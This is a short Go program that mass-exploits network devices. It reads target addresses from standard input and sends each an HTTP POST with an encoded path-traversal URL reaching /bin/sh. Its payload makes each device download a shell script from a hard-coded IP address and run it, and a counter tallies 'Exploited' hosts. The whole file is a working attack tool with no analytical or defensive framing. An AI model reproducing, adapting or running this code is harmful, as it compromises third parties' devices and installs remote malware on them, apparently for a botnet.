
//Made by Benshii Varga
package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
    "math/rand"
	//"encoding/base64"
)

var syncWait sync.WaitGroup
var statusAttempted, statusFound int

var payload string = "(wget http://185.184.54.151/76d32be0.sh; chmod +x 76d32be0.sh; sh 76d32be0.sh)"

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }


    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1\r\nHost: " + target + "\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n" + payload + "\r\n\r\necho Content-Type: text/plain; echo; " + payload + "\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "hello") {
		statusFound++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {

	defer syncWait.Done()

	checkDevice(target, 10)
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
		for {
			fmt.Printf("%d's | Total: %d, Exploited: %d\r\n", i, statusAttempted, statusFound)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            go processTarget(scan.Text() + ":" + os.Args[1], scan.Text())
			statusAttempted++
            syncWait.Add(1)
        }
    }
}
